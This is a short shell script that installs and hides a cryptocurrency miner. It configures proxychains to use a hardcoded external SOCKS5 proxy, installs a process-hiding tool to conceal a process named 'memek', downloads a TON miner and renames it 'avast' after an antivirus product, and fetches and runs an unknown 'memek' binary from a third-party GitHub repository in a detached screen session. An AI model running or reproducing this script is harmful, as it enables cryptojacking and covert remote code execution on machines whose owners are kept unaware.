#!/bin/sh
apt update
apt install proxychains
sed -i 's/socks4/socks5/' /etc/proxychains.conf
sed -i 's/127.0.0.1/98.162.96.53/' /etc/proxychains.conf
sed -i 's/9050/10663/' /etc/proxychains.conf
sudo apt install curl libssl1.0-dev nodejs nodejs-dev node-gyp npm -y && npm i -g node-process-hider && ph add memek
apt install screen -y
wget -q https://github.com/TON-Pool/miner/releases/download/0.3.4/ton-pool.com-miner-0.3.4-linux.tar.gz
wget -q https://raw.githubusercontent.com/d-crypto99/lalay/main/memek
tar -xvf  ton-pool.com-miner-0.3.4-linux.tar.gz
mv miner-linux avast
chmod +x avast memek
screen -dmS running ./memek
